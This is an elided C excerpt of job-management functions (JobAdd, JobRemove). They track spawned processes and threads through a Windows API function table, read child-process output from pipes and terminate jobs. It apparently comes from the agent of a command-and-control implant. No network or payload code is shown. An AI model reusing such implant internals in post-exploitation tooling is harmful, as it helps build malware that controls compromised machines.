...
VOID JobAdd( UINT32 RequestID, DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )
{
    ...
    Job = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( JOB_DATA ) );
    ...
    if ( ((INSTANCE *)Instance)->Jobs == NULL )
    {
        ((INSTANCE *)Instance)->Jobs = Job;
        return;
    }

    JobList = ((INSTANCE *)Instance)->Jobs;
    ...
    do {
        ...
        switch ( JobList->Type )
        {
            case JOB_TYPE_PROCESS:
            {
                ...
                {
                    DWORD Return = 0;
                    ((INSTANCE *)Instance)->Win32.GetExitCodeProcess( JobList->Handle, &Return );
            ...
            case JOB_TYPE_THREAD:
            {
                ...
                {
                    DWORD Return = 0;
                    ((INSTANCE *)Instance)->Win32.GetExitCodeThread( JobList->Handle, &Return );
            ...
            case JOB_TYPE_TRACK_PROCESS:
            {
                if ( JobList->State == JOB_STATE_RUNNING )
                {
                    ...
                    ((INSTANCE *)Instance)->Win32.GetExitCodeProcess( JobList->Handle, &Status );
                    ...
                    else
                    {
                        ...
                        if ( ((INSTANCE *)Instance)->Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                        {
                            ...
                            {
                                Size   = Available;
                                Buffer = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, Size );

                                if ( ((INSTANCE *)Instance)->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                {
        ...
        if ( JobList->JobID == JobID )
        {
            ...
            switch ( JobList->Type )
            {
                case JOB_TYPE_THREAD:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        ...
                        if ( JobList->Handle )
                        {
                            ...
                            if ( ! NT_SUCCESS( NtStatus = ((INSTANCE *)Instance)->Win32.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                            {
                ...
                case JOB_TYPE_PROCESS:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        ((INSTANCE *)Instance)->Win32.TerminateProcess( JobList->Handle, 0 );
                    }
                    break;
                }
...
VOID JobRemove( DWORD JobID )
{
    ...
    if ( ((INSTANCE *)Instance)->Jobs && ((INSTANCE *)Instance)->Jobs->JobID == JobID )
    {
        JobToRemove = ((INSTANCE *)Instance)->Jobs;
        ((INSTANCE *)Instance)->Jobs = JobToRemove->Next;
    }
    else
    {
        JobList = ((INSTANCE *)Instance)->Jobs;
    ...
    ((INSTANCE *)Instance)->Win32.LocalFree( JobToRemove );
    JobToRemove = NULL;
}
